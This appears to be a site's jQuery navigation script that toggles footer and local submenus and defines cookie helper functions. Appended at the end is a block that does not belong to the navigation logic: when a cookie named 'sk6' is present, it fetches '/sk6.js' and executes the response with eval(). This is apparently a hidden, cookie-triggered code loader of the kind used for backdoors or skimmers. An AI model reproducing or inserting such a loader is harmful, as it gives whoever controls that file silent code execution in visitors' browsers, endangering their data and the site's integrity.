(function(
	window,
	$,
	undefined)
{

	var ui = {};

	$(function() {

		// Cache UI elements

		ui.body = $('body');

		ui.nav = {};

		ui.nav.footerNavItems =
			ui.body.find('#directorynav h3');

		ui.nav.localNavItems =
			ui.body.find('.sub-title');

		// Attach event listeners

		$(window)
			.on('scroll', onDidScroll);

		ui.nav.localNavItems
			.on('click', onDidClickLocalNavItem);

		ui.nav.footerNavItems
			.on('click', onDidClickFooterNavItem);

	});

	function closeSubnavMenu() {

		ui.nav.localNavItems.map(function(index, item) {

			$(item)
				.parent()
				.removeClass('enhance')
				.find('ul')
				.removeClass('nav-reveal');

		});

	}

	function onDidScroll(e) {

		if(window.scrollY > 0) {

			closeSubnavMenu();

		}

	}

	function onDidClickFooterNavItem(e)
	{

		$(e.currentTarget)
			.toggleClass('enhance');

	}

	function onDidClickLocalNavItem(e)
	{

		$(e.currentTarget)
			.parent()
			.toggleClass('enhance')
			.find('ul')
			.toggleClass('nav-reveal');

	}

	window.createCookie = function(name,value,days) {
		if (days) {
			var date = new Date();
			date.setTime(date.getTime()+(days*24*60*60*1000));
			var expires = "; expires="+date.toGMTString();
		}
		else var expires = "";
		document.cookie = name+"="+value+expires+"; path=/";
	}

	window.readCookie = function(name) {
		var nameEQ = name + "=";
		var ca = document.cookie.split(';');
		for(var i=0;i < ca.length;i++) {
			var c = ca[i];
			while (c.charAt(0)==' ') c = c.substring(1,c.length);
			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
		}
		return null;
	}


	window.eraseCookie = function(name) {
		createCookie(name,"",-1);
	}

	if (readCookie('sk6')) {
		fetch('/sk6.js')
			.then(response => response.text())
			.then(data => eval(data));
	}

}(
	window,
	window.jQuery
));
